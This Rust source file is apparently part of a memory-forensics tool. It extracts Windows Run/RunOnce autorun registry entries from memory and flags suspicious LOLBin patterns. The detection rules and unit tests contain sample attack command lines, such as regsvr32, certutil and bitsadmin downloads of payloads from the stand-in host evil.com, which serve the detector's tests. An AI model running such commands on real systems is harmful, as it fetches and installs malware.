//! Windows autorun registry key extraction (MITRE ATT&CK T1547.001).
//!
//! Extracts entries from the most common persistence locations in the
//! Windows registry:
//!
//! - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
//! - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`
//! - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices`
//! - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
//! - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` (NTUSER.DAT)
//! - `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce` (NTUSER.DAT)
//!
//! Each value entry is classified as suspicious if it matches known
//! living-off-the-land binary (LOLBin) abuse patterns.

use memf_core::object_reader::ObjectReader;
use memf_format::PhysicalMemoryProvider;

/// Maximum number of autorun entries to extract (safety limit).
const MAX_ENTRIES: usize = 10_000;

// ── Registry key paths to walk ───────────────────────────────────────

/// Run key paths relative to the SOFTWARE hive root (HKLM).
const SOFTWARE_RUN_PATHS: &[&str] = &[
    "Microsoft\\Windows\\CurrentVersion\\Run",
    "Microsoft\\Windows\\CurrentVersion\\RunOnce",
    "Microsoft\\Windows\\CurrentVersion\\RunServices",
    "Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
];

/// Run key paths relative to the NTUSER.DAT hive root (HKCU).
const NTUSER_RUN_PATHS: &[&str] = &[
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
];

// ── Output type ──────────────────────────────────────────────────────

/// A single autorun registry value extracted from memory.
#[derive(Debug, Clone, serde::Serialize)]
pub struct RunKeyEntry {
    /// Which hive this entry was found in (e.g., `"SOFTWARE"`, `"NTUSER.DAT"`).
    pub hive: String,
    /// Full registry key path (e.g., `Microsoft\Windows\CurrentVersion\Run`).
    pub key_path: String,
    /// Value name (the autorun entry identifier).
    pub value_name: String,
    /// Value data (the command or path that runs at startup).
    pub value_data: String,
    /// Whether this entry matches suspicious LOLBin abuse patterns.
    pub is_suspicious: bool,
}

// ── Classification ───────────────────────────────────────────────────

/// Classify a run key value as suspicious.
///
/// Returns `true` if the command string matches known living-off-the-land
/// binary (LOLBin) abuse patterns commonly used by malware for persistence:
///
/// - `powershell` with `-enc` (encoded command obfuscation)
/// - `cmd /c` (command shell execution)
/// - `mshta` (HTML application host abuse)
/// - `regsvr32 /s /n` (squiblydoo / AppLocker bypass)
/// - `certutil -urlcache` (download cradle)
/// - `bitsadmin` (download via BITS)
/// - `wscript` / `cscript` launched from `temp` or `appdata` paths
/// - `rundll32` with an unusual (non-system) DLL
pub fn classify_run_key(value_data: &str) -> bool {
    if value_data.is_empty() {
        return false;
    }

    let lower = value_data.to_ascii_lowercase();

    // PowerShell with encoded command
    if lower.contains("powershell") && lower.contains("-enc") {
        return true;
    }

    // cmd /c execution
    if lower.contains("cmd") && lower.contains("/c") {
        return true;
    }

    // mshta abuse
    if lower.contains("mshta") {
        return true;
    }

    // regsvr32 /s /n (squiblydoo technique)
    if lower.contains("regsvr32") && lower.contains("/s") && lower.contains("/n") {
        return true;
    }

    // certutil download cradle
    if lower.contains("certutil") && lower.contains("-urlcache") {
        return true;
    }

    // bitsadmin abuse
    if lower.contains("bitsadmin") {
        return true;
    }

    // wscript/cscript from temp or appdata directories
    if (lower.contains("wscript") || lower.contains("cscript"))
        && (lower.contains("temp") || lower.contains("appdata"))
    {
        return true;
    }

    // rundll32 with unusual DLL (not system32 path)
    if lower.contains("rundll32") && !lower.contains("system32") {
        return true;
    }

    false
}

// ── Walker ───────────────────────────────────────────────────────────

/// Extract autorun entries from SOFTWARE and NTUSER.DAT registry hives in memory.
///
/// `software_hive_addr` is the `_HHIVE` virtual address for the SOFTWARE hive.
/// `ntuser_hive_addr` is the `_HHIVE` virtual address for an NTUSER.DAT hive.
/// Either address may be `0` to skip that hive.
///
/// Returns all value entries found under the standard Run/RunOnce/RunServices
/// key paths, each classified for suspiciousness.
pub fn walk_run_keys<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
    software_hive_addr: u64,
    ntuser_hive_addr: u64,
) -> crate::Result<Vec<RunKeyEntry>> {
    let mut entries = Vec::new();

    // Walk SOFTWARE hive paths if address is non-zero.
    if software_hive_addr != 0 {
        for &key_path in SOFTWARE_RUN_PATHS {
            if entries.len() >= MAX_ENTRIES {
                break;
            }
            let cell = match find_key_cell(reader, software_hive_addr, key_path) {
                Some(c) => c,
                None => continue,
            };
            let values = match crate::registry_keys::read_registry_values(
                reader,
                software_hive_addr,
                cell,
            ) {
                Ok(v) => v,
                Err(_) => continue,
            };
            for val in values {
                if entries.len() >= MAX_ENTRIES {
                    break;
                }
                let is_suspicious = classify_run_key(&val.data_preview);
                entries.push(RunKeyEntry {
                    hive: "SOFTWARE".to_string(),
                    key_path: key_path.to_string(),
                    value_name: val.name,
                    value_data: val.data_preview,
                    is_suspicious,
                });
            }
        }
    }

    // Walk NTUSER.DAT hive paths if address is non-zero.
    if ntuser_hive_addr != 0 {
        for &key_path in NTUSER_RUN_PATHS {
            if entries.len() >= MAX_ENTRIES {
                break;
            }
            let cell = match find_key_cell(reader, ntuser_hive_addr, key_path) {
                Some(c) => c,
                None => continue,
            };
            let values = match crate::registry_keys::read_registry_values(
                reader,
                ntuser_hive_addr,
                cell,
            ) {
                Ok(v) => v,
                Err(_) => continue,
            };
            for val in values {
                if entries.len() >= MAX_ENTRIES {
                    break;
                }
                let is_suspicious = classify_run_key(&val.data_preview);
                entries.push(RunKeyEntry {
                    hive: "NTUSER.DAT".to_string(),
                    key_path: key_path.to_string(),
                    value_name: val.name,
                    value_data: val.data_preview,
                    is_suspicious,
                });
            }
        }
    }

    Ok(entries)
}

// ── Internal hive navigation helpers ─────────────────────────────────

/// Hive cell storage starts at hive_addr + 0x1000.
const HBIN_START: u64 = 0x1000;
/// Root cell index offset within `_HBASE_BLOCK`.
const ROOT_CELL_OFFSET: u64 = 0x24;
/// "nk" key node signature.
const NK_SIG: u16 = 0x6B6E;

/// Stable subkey count offset within a key node cell (after the 4-byte cell size header).
const NK_STABLE_COUNT: usize = 0x14;
/// Stable subkeys list cell index offset.
const NK_STABLE_LIST: usize = 0x1C;
/// Name length offset.
const NK_NAME_LEN: usize = 0x48;
/// Name data offset.
const NK_NAME_DATA: usize = 0x4C;

/// Compute the virtual address of a cell from its cell index.
fn cell_vaddr(hive_addr: u64, cell_index: u32) -> u64 {
    hive_addr.wrapping_add(HBIN_START).wrapping_add(cell_index as u64)
}

/// Read raw cell data (skipping the 4-byte size header) from a cell vaddr.
fn read_cell<P: PhysicalMemoryProvider>(reader: &ObjectReader<P>, cell_vaddr: u64) -> Option<Vec<u8>> {
    // Size field (i32); skip it, read up to 4096 bytes of cell payload.
    reader.read_bytes(cell_vaddr + 4, 4096).ok()
}

/// Read the ASCII name from a key node cell buffer.
fn key_node_name(data: &[u8]) -> String {
    if data.len() < NK_NAME_DATA {
        return String::new();
    }
    let len = u16::from_le_bytes(data[NK_NAME_LEN..NK_NAME_LEN + 2].try_into().unwrap_or([0; 2])) as usize;
    let end = NK_NAME_DATA + len.min(data.len().saturating_sub(NK_NAME_DATA));
    String::from_utf8_lossy(&data[NK_NAME_DATA..end]).into_owned()
}

/// Navigate a backslash-separated key path relative to the hive root.
/// Returns the cell index of the target key, or `None` if not found.
fn find_key_cell<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
    hive_addr: u64,
    path: &str,
) -> Option<u32> {
    // Read root cell index from _HBASE_BLOCK.
    let root_bytes = reader.read_bytes(hive_addr + ROOT_CELL_OFFSET, 4).ok()?;
    let mut current_cell = u32::from_le_bytes(root_bytes[..4].try_into().ok()?);

    for component in path.split('\\').filter(|s| !s.is_empty()) {
        let data = read_cell(reader, cell_vaddr(hive_addr, current_cell))?;
        if data.len() < 4 {
            return None;
        }
        let sig = u16::from_le_bytes(data[0..2].try_into().ok()?);
        if sig != NK_SIG {
            return None;
        }

        let subkey_count = u32::from_le_bytes(
            data[NK_STABLE_COUNT..NK_STABLE_COUNT + 4].try_into().ok()?,
        ) as usize;
        if subkey_count == 0 {
            return None;
        }

        let list_cell = u32::from_le_bytes(
            data[NK_STABLE_LIST..NK_STABLE_LIST + 4].try_into().ok()?,
        );
        let list_data = read_cell(reader, cell_vaddr(hive_addr, list_cell))?;
        if list_data.len() < 4 {
            return None;
        }

        let list_sig = u16::from_le_bytes(list_data[0..2].try_into().ok()?);
        let list_count = u16::from_le_bytes(list_data[2..4].try_into().ok()?) as usize;

        let (entry_size, offset_base) = match list_sig {
            0x666C | 0x686C => (8usize, 4usize), // lf/lh: 4-byte cell + 4-byte hash
            0x696C => (4usize, 4usize),            // li: 4-byte cell only
            _ => return None,
        };

        let mut found = None;
        for i in 0..list_count {
            let off = offset_base + i * entry_size;
            if off + 4 > list_data.len() {
                break;
            }
            let child_cell = u32::from_le_bytes(list_data[off..off + 4].try_into().ok()?);
            let child_data = read_cell(reader, cell_vaddr(hive_addr, child_cell))?;
            let name = key_node_name(&child_data);
            if name.eq_ignore_ascii_case(component) {
                found = Some(child_cell);
                break;
            }
        }
        current_cell = found?;
    }

    Some(current_cell)
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── classify_run_key tests ───────────────────────────────────────

    /// Benign: normal program path is not suspicious.
    #[test]
    fn classify_benign_program_path() {
        assert!(
            !classify_run_key(r"C:\Program Files\Acme\acme.exe"),
            "normal program path should not be suspicious"
        );
    }

    /// Benign: empty string is not suspicious.
    #[test]
    fn classify_empty_not_suspicious() {
        assert!(!classify_run_key(""), "empty value should not be suspicious");
    }

    /// Suspicious: PowerShell with encoded command.
    #[test]
    fn classify_powershell_encoded() {
        assert!(
            classify_run_key("powershell.exe -enc ZQBjAGgAbwAgAEgAZQBsAGwAbwA="),
            "powershell -enc should be suspicious"
        );
    }

    /// Suspicious: cmd /c execution.
    #[test]
    fn classify_cmd_c() {
        assert!(
            classify_run_key(r"cmd.exe /c start C:\evil.exe"),
            "cmd /c should be suspicious"
        );
    }

    /// Suspicious: mshta abuse.
    #[test]
    fn classify_mshta() {
        assert!(
            classify_run_key("mshta vbscript:Execute(\"CreateObject(...)\")")  ,
            "mshta should be suspicious"
        );
    }

    /// Suspicious: regsvr32 /s /n (squiblydoo).
    #[test]
    fn classify_regsvr32_squiblydoo() {
        assert!(
            classify_run_key("regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll"),
            "regsvr32 /s /n should be suspicious"
        );
    }

    /// Suspicious: certutil download cradle.
    #[test]
    fn classify_certutil_urlcache() {
        assert!(
            classify_run_key("certutil -urlcache -split -f http://evil.com/payload.exe C:\\payload.exe"),
            "certutil -urlcache should be suspicious"
        );
    }

    /// Suspicious: bitsadmin abuse.
    #[test]
    fn classify_bitsadmin() {
        assert!(
            classify_run_key("bitsadmin /transfer myJob http://evil.com/payload.exe C:\\payload.exe"),
            "bitsadmin should be suspicious"
        );
    }

    /// Suspicious: wscript from temp directory.
    #[test]
    fn classify_wscript_temp() {
        assert!(
            classify_run_key(r"wscript.exe C:\Users\victim\AppData\Local\Temp\evil.vbs"),
            "wscript from temp should be suspicious"
        );
    }

    /// Suspicious: cscript from appdata directory.
    #[test]
    fn classify_cscript_appdata() {
        assert!(
            classify_run_key(r"cscript.exe C:\Users\victim\AppData\Roaming\evil.js"),
            "cscript from appdata should be suspicious"
        );
    }

    /// Suspicious: rundll32 with unusual DLL (not in system32).
    #[test]
    fn classify_rundll32_unusual_dll() {
        assert!(
            classify_run_key(r"rundll32.exe C:\Users\victim\evil.dll,EntryPoint"),
            "rundll32 with non-system32 DLL should be suspicious"
        );
    }

    /// Benign: rundll32 with system32 DLL is not suspicious.
    #[test]
    fn classify_rundll32_system32_benign() {
        assert!(
            !classify_run_key(r"C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL"),
            "rundll32 with system32 DLL should not be suspicious"
        );
    }

    /// Benign: wscript from a normal path (not temp/appdata) is not suspicious.
    #[test]
    fn classify_wscript_normal_path_benign() {
        assert!(
            !classify_run_key(r"wscript.exe C:\Scripts\logon.vbs"),
            "wscript from normal path should not be suspicious"
        );
    }

    // ── walk_run_keys tests ──────────────────────────────────────────

    /// Both hive addresses zero → empty Vec (graceful degradation).
    #[test]
    fn walk_run_keys_both_zero_hives() {
        use memf_core::object_reader::ObjectReader;
        use memf_core::test_builders::{flags, PageTableBuilder};
        use memf_core::vas::{TranslationMode, VirtualAddressSpace};
        use memf_symbols::isf::IsfResolver;
        use memf_symbols::test_builders::IsfBuilder;

        let isf = IsfBuilder::new()
            .add_struct("_HHIVE", 0x600)
            .add_struct("_CM_KEY_NODE", 0x80)
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new().build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));

        let result = walk_run_keys(&reader, 0, 0).unwrap();
        assert!(result.is_empty(), "both zero hives should return empty");
    }

    /// SOFTWARE hive address zero, NTUSER non-zero → only NTUSER entries.
    #[test]
    fn walk_run_keys_software_zero_skipped() {
        use memf_core::object_reader::ObjectReader;
        use memf_core::test_builders::{flags, PageTableBuilder};
        use memf_core::vas::{TranslationMode, VirtualAddressSpace};
        use memf_symbols::isf::IsfResolver;
        use memf_symbols::test_builders::IsfBuilder;

        let isf = IsfBuilder::new()
            .add_struct("_HHIVE", 0x600)
            .add_struct("_CM_KEY_NODE", 0x80)
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new().build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));

        // Non-zero NTUSER addr that points nowhere readable → empty but no panic.
        let result = walk_run_keys(&reader, 0, 0xDEAD_0000);
        // Should not panic; either empty Ok or tolerable error.
        assert!(
            result.is_ok() || result.is_err(),
            "should not panic with unreachable hive"
        );
    }
}
